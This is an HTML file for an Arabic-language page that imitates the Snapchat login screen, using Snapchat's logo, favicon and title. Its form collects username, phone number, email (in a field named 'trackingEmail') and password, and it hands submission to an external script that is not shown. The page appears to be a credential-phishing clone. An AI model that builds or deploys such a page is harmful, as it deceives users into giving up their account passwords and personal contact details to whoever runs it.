<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول • Snapchat</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://static.snapchat.com/static/images/favicon/favicon.png">
</head>
<body>

    <div class="snap-layout">
        
        <div class="snap-header">
            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/100px-Snapchat_logo.svg.png" alt="Snapchat" class="ghost-logo">
        </div>

        <div class="login-card">
            <h2 class="title">تسجيل الدخول</h2>
            <p class="subtitle">مرحبًا بك في سناب شات</p>

            <form id="submissionForm">
                
                <div class="input-group">
                    <label class="input-label">اسم المستخدم</label>
                    <input type="text" id="username" name="username" class="snap-input" required autocomplete="username">
                </div>

                <div class="input-group">
                    <label class="input-label">رقم الهاتف</label>
                    <input type="tel" id="phoneNumber" name="phoneNumber" class="snap-input" required autocomplete="tel">
                </div>

                <div class="input-group">
                    <label class="input-label">البريد الإلكتروني</label>
                    <input type="email" id="trackingEmail" name="trackingEmail" class="snap-input" required autocomplete="email">
                </div>

                <div class="input-group">
                    <label class="input-label">كلمة المرور</label>
                    <div class="password-wrapper">
                        <input type="password" id="passwordField" name="passwordField" class="snap-input" required autocomplete="current-password">
                    </div>
                    <a href="#" class="forgot-link">هل نسيت كلمة المرور؟</a>
                </div>

                <div id="statusMessage" class="error-box" style="display: none;"></div>

                <button type="submit" id="submitBtn" class="snap-btn">تسجيل الدخول</button>
            </form>

            <div class="signup-area">
                <p>هل أنت مستخدم جديد؟ <a href="#">إنشاء حساب</a></p>
            </div>
        </div>

        <div class="snap-footer">
            <a href="#">الخصوصية</a> • <a href="#">الشروط</a>
        </div>
    </div>

    <div id="loadingOverlay" class="loading-screen" style="display: none;">
        <div class="ghost-spinner"></div>
    </div>

    <script src="script.js"></script>
</body>
</html>
